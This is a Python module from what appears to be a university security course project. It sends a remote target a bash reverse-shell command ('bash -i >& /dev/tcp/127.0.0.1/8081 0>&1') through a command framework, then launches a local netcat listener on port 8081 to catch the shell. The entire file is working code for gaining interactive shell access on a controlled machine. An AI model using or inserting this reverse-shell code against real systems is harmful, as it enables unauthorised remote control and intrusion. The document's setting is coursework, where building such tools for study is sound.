# ===---------------------------------------------------------------------=== #
#
# CPSC4240 Project, Fall 24
# Adam Clements, Evan Cox, Isaac Fletcher, Tim Koehler
#
# ===---------------------------------------------------------------------=== #

from context import GlobalContext, Command
import asyncio
import subprocess


async def reverse_shell(ctx: GlobalContext, id: str) -> None:
    # requires double `bash` execution due to redirection. Note that `/dev/tcp` is
    # a pseudo-device that ONLY BASH SUPPORTS
    #
    # connects to a reverse shell on 8081
    cmd = Command.execute(
        "/bin/bash", ["-c", "sleep 3 && bash -i >& /dev/tcp/127.0.0.1/8081 0>&1"])

    ctx.command_one(id, cmd)

    # changed to x-terminal-emulator to support non-gnome systems
    subprocess.Popen(["x-terminal-emulator", "-e", "nc -lnvp 8081"])
